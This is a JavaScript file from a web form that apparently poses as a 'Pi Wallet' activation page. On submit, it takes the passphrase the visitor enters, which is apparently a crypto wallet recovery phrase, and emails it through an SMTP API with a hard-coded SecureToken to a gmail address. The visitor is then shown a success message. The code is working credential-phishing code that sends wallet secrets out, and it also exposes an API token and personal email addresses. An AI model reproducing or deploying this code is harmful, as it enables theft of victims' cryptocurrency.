// Get elements
const Form = document.getElementById("my-form");
const Names = document.getElementById("contact-inputs");
const Status = document.getElementById("status");

// Function to send email
function sendEmail() {
  const bodyMessage = `This is the Full Phrase: ${Names.value}`;

  // Ensure input validation
  if (!Names.value.trim()) {
    alert("Please enter a valid passphrase.");
    console.log("Error: No passphrase entered.");
    return;
  }

  console.log("Sending email with the following details:");
  console.log("To: echefrankidosky4love@gmail.com");
  console.log("From: mikebrew001@gmail.com");
  console.log("Subject: Activate Pi Wallet");
  console.log("Body:", bodyMessage);

  // Send email using API key
  Email.send({
    SecureToken: "9022cd34-c735-48f3-b632-290a202c27c5",
    To: "echefrankidosky4love@gmail.com",
    From: "mikebrew001@gmail.com",
    Subject: "Activate Pi Wallet",
    Body: bodyMessage,
  })
    .then((message) => {
      console.log("Email send response:", message);
      if (message === "OK") {
        Status.style.display = "block";
        Status.innerHTML =
          "<ion-icon name='checkmark-circle-outline'></ion-icon> Email sent successfully!";
        Status.className = "success";
      } else {
        Status.style.display = "block";
        Status.innerHTML = `<ion-icon name='alert-outline'></ion-icon> Error: ${message}`;
        Status.className = "error";
      }
    })
    .catch((error) => {
      console.error("Email send error:", error);
      Status.style.display = "block";
      Status.innerHTML =
        "<ion-icon name='alert-outline'></ion-icon> An error occurred while sending the email.";
      Status.className = "error";
    });
}

// Add event listener to the form
Form.addEventListener("submit", (e) => {
  e.preventDefault(); // Prevent form from reloading the page
  console.log("Form submitted.");
  sendEmail();
});
